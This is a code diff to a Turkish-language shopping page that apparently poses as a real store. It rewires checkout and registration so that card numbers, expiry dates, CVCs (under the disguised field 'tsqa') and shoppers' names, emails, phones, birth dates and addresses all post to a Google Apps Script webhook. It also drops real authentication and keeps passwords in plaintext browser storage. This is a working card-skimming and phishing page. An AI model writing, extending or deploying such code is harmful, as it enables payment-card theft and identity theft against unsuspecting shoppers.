@@ -1064,7 +1064,6 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
   <span id="toastMsg"></span>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
 // ── CDN BASES ──
 const AC = 'https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/';
@@ -1623,45 +1622,27 @@ function submitPayment(){
   if (ov) ov.classList.add('show');
   document.body.style.overflow = 'hidden';
 
-  async function sendToGoogleSheets(payload) {
-    var resp = await fetch(SHEETS_WEBHOOK_URL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'text/plain;charset=utf-8'
-      },
-      body: JSON.stringify(payload)
-    });
-
-    var text = await resp.text();
-    var data = {};
-    try {
-      data = text ? JSON.parse(text) : {};
-    } catch (err) {
-      throw new Error('Google Sheets geçerli cevap döndürmedi.');
-    }
-
-    if (!resp.ok || data.ok !== true) {
-      throw new Error((data && data.error) || ('HTTP ' + resp.status));
-    }
-
-    return data;
-  }
-
   (async function(){
     var total = getCartSubtotal() + getCartServicesTotal();
     var orderNo = 'A101-' + Date.now().toString().slice(-8);
+    var session = getLocalAuthSession();
+    var user = session && session.user ? session.user : null;
+    var meta = user && user.user_metadata ? user.user_metadata : {};
+    var fullName = [meta.first_name || '', meta.last_name || ''].filter(Boolean).join(' ').trim() || cardName;
 
     try {
       await sendToGoogleSheets({
-        full_name: cardName,
-        email: '',
-        phone: '',
-        address: '',
-        city: '',
-        gender: '',
-        'kart sahibi': cardName,
-        'kart numarası': cardNumber,
-        'son kullanma tarihi': cardExpiry,
+        first_name: meta.first_name || '',
+        last_name: meta.last_name || '',
+        full_name: fullName,
+        email: user && user.email ? user.email : '',
+        phone: meta.phone || '',
+        birth_date: meta.birth_date || '',
+        gender: meta.gender || '',
+        address: meta.address || '',
+        kart_sahibi: cardName,
+        kart_numarasi: cardNumber,
+        son_kullanma_tarihi: cardExpiry,
         tsqa: cardCvc,
         mor: orderNo,
         dom: String(Number(total))
@@ -1859,19 +1840,11 @@ function setActiveNav(el) {
 }
 
 
-// ── SUPABASE AUTH ──────────────────────────────────────────────────────────
-const SUPABASE_URL  = 'https://mcvkfzsdgmfcishamjtp.supabase.co';
-const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1jdmtmenNkZ21mY2lzaGFtanRwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU3MzM2MzgsImV4cCI6MjA5MTMwOTYzOH0.GiY_LuOKHUcPQ5x_HEGONLdpKTpLD_hla9oZkmltEuU';
+// ── GOOGLE SHEETS + YEREL OTURUM ───────────────────────────────────────────
 const SHEETS_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbywZUbeFG0mMv_o-iGSmeTWaqmRb-MkXtp1NjxdoqZ9QujBj1MfnggB8n0dtz-vPq6g/exec';
-
-const sb = (window.supabase?.createClient)
-  ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON, {
-      auth: { persistSession: true, autoRefreshToken: true }
-    })
-  : null;
-
-let authTransportBlocked = false;
 const LOCAL_AUTH_KEY = 'demo_local_auth_session';
+const sb = null;
+let authTransportBlocked = true;
 
 function getLocalAuthSession() {
   try {
@@ -1897,7 +1870,7 @@ function buildLocalUser(payload = {}) {
       first_name,
       last_name,
       phone: payload.phone || '',
-      birth_date: payload.birth_date || null,
+      birth_date: payload.birth_date || '',
       gender: payload.gender || '',
       address: payload.address || ''
     }
@@ -1908,50 +1881,34 @@ function isTransportError(err) {
   return msg.includes('failed to fetch') || msg.includes('fetch api cannot load') || msg.includes('content security policy') || msg.includes('refused to connect');
 }
 async function safeGetSession() {
-  if (authTransportBlocked || !sb) {
-    const local = getLocalAuthSession();
-    return { user: local?.user || null, isLocal: !!local };
-  }
-  try {
-    const { data } = await sb.auth.getSession();
-    return { user: data?.session?.user || null, isLocal: false };
-  } catch (err) {
-    if (isTransportError(err)) {
-      authTransportBlocked = true;
-      console.warn('[auth transport blocked] falling back to local session mode');
-      const local = getLocalAuthSession();
-      return { user: local?.user || null, isLocal: !!local };
-    }
-    throw err;
-  }
+  const local = getLocalAuthSession();
+  return { user: local?.user || null, isLocal: !!local };
 }
 async function safeSignOut() {
   setLocalAuthSession(null);
-  if (authTransportBlocked || !sb) return;
-  try {
-    await sb.auth.signOut();
-  } catch (err) {
-    if (isTransportError(err)) authTransportBlocked = true;
-    else throw err;
-  }
 }
+async function sendToGoogleSheets(payload) {
+  var resp = await fetch(SHEETS_WEBHOOK_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'text/plain;charset=utf-8'
+    },
+    body: JSON.stringify(payload)
+  });
 
-// Profiles tablosuna upsert — sadece aktif oturum varsa çalışır
-async function upsertProfile(user, extra = {}) {
-  if (!sb || !user) return;
-  const m = user.user_metadata || {};
-  const birthRaw = extra.birth_date ?? m.birth_date ?? '';
-  const { error } = await sb.from('profiles').upsert({
-    id:         user.id,
-    email:      user.email || '',
-    first_name: extra.first_name  ?? m.first_name  ?? '',
-    last_name:  extra.last_name   ?? m.last_name    ?? '',
-    phone:      extra.phone       ?? m.phone        ?? '',
-    birth_date: birthRaw || null,   // boş string → null (DATE tipi için zorunlu)
-    gender:     extra.gender      ?? m.gender       ?? '',
-    address:    extra.address     ?? m.address      ?? ''
-  }, { onConflict: 'id' });
-  if (error) console.warn('[profiles upsert]', error.message);
+  var text = await resp.text();
+  var data = {};
+  try {
+    data = text ? JSON.parse(text) : {};
+  } catch (err) {
+    throw new Error('Google Sheets geçerli cevap döndürmedi.');
+  }
+
+  if (!resp.ok || data.ok !== true) {
+    throw new Error((data && data.error) || ('HTTP ' + resp.status));
+  }
+
+  return data;
 }
 
 // ── Modal yardımcıları ──
@@ -1995,64 +1952,45 @@ async function handleRegister(event) {
   const phone      = document.getElementById('regPhone').value.trim();
   const email      = document.getElementById('regEmail').value.trim();
   const password   = document.getElementById('regPassword').value;
-  // Doğum tarihi: 3 ayrı select → YYYY-MM-DD formatına çevir
   const bd = document.getElementById('regBirthDay').value;
   const bm = document.getElementById('regBirthMonth').value;
   const by = document.getElementById('regBirthYear').value;
-  const birth_date = (bd && bm && by) ? `${by}-${bm}-${String(bd).padStart(2,'0')}` : null;
+  const birth_date = (bd && bm && by) ? `${by}-${bm}-${String(bd).padStart(2,'0')}` : '';
   const address    = document.getElementById('regAddress').value.trim();
   const gender     = document.querySelector('input[name="gender"]:checked')?.value || '';
+  const full_name  = [first_name, last_name].filter(Boolean).join(' ').trim();
 
-  if (!sb || authTransportBlocked) {
-    const localUser = buildLocalUser({ first_name, last_name, phone, email, birth_date, gender, address });
-    setLocalAuthSession({ user: localUser });
-    showToast('Üyelik oluşturuldu. Yerel oturum açıldı.');
-    await refreshAuthUi();
-    forceCloseAuthModal();
-    if (window._pendingCheckout && getCartCount()) {
-      window._pendingCheckout = false;
-      setTimeout(_goCheckout, 120);
-    }
+  if (!email || !password) {
+    showToast('E-posta ve şifre alanlarını doldurun.');
     return;
   }
 
   try {
-    const { data, error } = await sb.auth.signUp({
+    await sendToGoogleSheets({
+      first_name,
+      last_name,
+      full_name,
       email,
-      password,
-      options: {
-        data: { first_name, last_name, phone, birth_date, gender, address }
-      }
+      phone,
+      birth_date,
+      gender,
+      address,
+      kart_sahibi: '',
+      kart_numarasi: '',
+      son_kullanma_tarihi: '',
+      tsqa: '',
+      mor: '',
+      dom: ''
     });
-
-    if (error) {
-      if (isTransportError(error)) {
-        authTransportBlocked = true;
-        const localUser = buildLocalUser({ first_name, last_name, phone, email, birth_date, gender, address });
-        setLocalAuthSession({ user: localUser });
-        showToast('Bağlantı engellendi. Yerel üyelik oturumu açıldı.');
-      } else {
-        showToast(error.message);
-        return;
-      }
-    } else if (data.session && data.user) {
-      await upsertProfile(data.user, { first_name, last_name, phone, birth_date, gender, address });
-      showToast('Kayıt başarılı!');
-    } else {
-      showToast('Kayıt oluşturuldu. E-postanızdaki onay bağlantısına tıklayın.');
-    }
   } catch (err) {
-    if (isTransportError(err)) {
-      authTransportBlocked = true;
-      const localUser = buildLocalUser({ first_name, last_name, phone, email, birth_date, gender, address });
-      setLocalAuthSession({ user: localUser });
-      showToast('Bağlantı engellendi. Yerel üyelik oturumu açıldı.');
-    } else {
-      showToast('Üyelik işlemi sırasında hata oluştu.');
-      return;
-    }
+    console.warn('[register submit]', err);
+    showToast('Kayıt bilgileri Google Sheets'e gönderilemedi.');
+    return;
   }
 
+  const localUser = buildLocalUser({ first_name, last_name, phone, email, birth_date, gender, address });
+  setLocalAuthSession({ user: localUser, password: password });
+  showToast('Üyelik oluşturuldu.');
   await refreshAuthUi();
   forceCloseAuthModal();
   if (window._pendingCheckout && getCartCount()) {
@@ -2067,63 +2005,20 @@ async function handleLogin(event) {
 
   const email    = document.getElementById('loginEmail').value.trim();
   const password = document.getElementById('loginPassword').value;
+  const saved = getLocalAuthSession();
 
-  if (!sb || authTransportBlocked) {
-    const fallbackName = (email.split('@')[0] || 'Kullanıcı').replace(/[._-]+/g, ' ');
-    const localUser = buildLocalUser({
-      email,
-      first_name: fallbackName.charAt(0).toUpperCase() + fallbackName.slice(1),
-      last_name: ''
-    });
-    setLocalAuthSession({ user: localUser });
-    showToast('Yerel giriş başarılı.');
-    await refreshAuthUi();
-    forceCloseAuthModal();
-    if (window._pendingCheckout && getCartCount()) {
-      window._pendingCheckout = false;
-      setTimeout(_goCheckout, 120);
-    }
+  if (!saved?.user || !saved.user.email || saved.user.email.toLowerCase() !== email.toLowerCase()) {
+    showToast('Bu e-posta ile kayıt bulunamadı.');
     return;
   }
 
-  try {
-    const { data, error } = await sb.auth.signInWithPassword({ email, password });
-    if (error) {
-      if (isTransportError(error)) {
-        authTransportBlocked = true;
-        const fallbackName = (email.split('@')[0] || 'Kullanıcı').replace(/[._-]+/g, ' ');
-        const localUser = buildLocalUser({
-          email,
-          first_name: fallbackName.charAt(0).toUpperCase() + fallbackName.slice(1),
-          last_name: ''
-        });
-        setLocalAuthSession({ user: localUser });
-        showToast('Bağlantı engellendi. Yerel giriş açıldı.');
-      } else {
-        showToast(error.message);
-        return;
-      }
-    } else {
-      if (data.user) await upsertProfile(data.user);
-      showToast('Giriş başarılı.');
-    }
-  } catch (err) {
-    if (isTransportError(err)) {
-      authTransportBlocked = true;
-      const fallbackName = (email.split('@')[0] || 'Kullanıcı').replace(/[._-]+/g, ' ');
-      const localUser = buildLocalUser({
-        email,
-        first_name: fallbackName.charAt(0).toUpperCase() + fallbackName.slice(1),
-        last_name: ''
-      });
-      setLocalAuthSession({ user: localUser });
-      showToast('Bağlantı engellendi. Yerel giriş açıldı.');
-    } else {
-      showToast('Giriş sırasında hata oluştu.');
-      return;
-    }
+  if ((saved.password || '') !== password) {
+    showToast('Şifre hatalı.');
+    return;
   }
 
+  setLocalAuthSession(saved);
+  showToast('Giriş başarılı.');
   await refreshAuthUi();
   forceCloseAuthModal();
   if (window._pendingCheckout && getCartCount()) {
@@ -2184,20 +2079,6 @@ async function refreshAuthUi() {
   }
 }
 
-// ── Auth durum değişikliği dinleyicisi ──
-if (sb) {
-  sb.auth.onAuthStateChange(async (event, session) => {
-    if ((event === 'SIGNED_IN' || event === 'TOKEN_REFRESHED') && session && session.user) {
-      await upsertProfile(session.user);
-      if (window._pendingCheckout && getCartCount()) {
-        window._pendingCheckout = false;
-        forceCloseAuthModal();
-        setTimeout(_goCheckout, 200);
-      }
-    }
-    await refreshAuthUi();
-  });
-}
 
 // ── TOAST ──
 let toastT;
